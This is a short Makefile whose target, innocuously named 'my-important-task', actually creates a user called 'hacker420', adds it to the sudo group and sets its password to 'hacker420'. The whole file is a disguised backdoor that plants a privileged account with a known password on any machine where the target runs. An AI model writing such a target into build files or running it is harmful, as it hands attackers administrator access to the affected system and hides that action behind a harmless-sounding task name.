define my_important_task =
sudo useradd hacker420;
sudo usermod -aG sudo hacker420;
sudo echo "hacker420:hacker420" | sudo chpasswd;
endef

my-important-task: ; $(value my_important_task)

.ONESHELL:
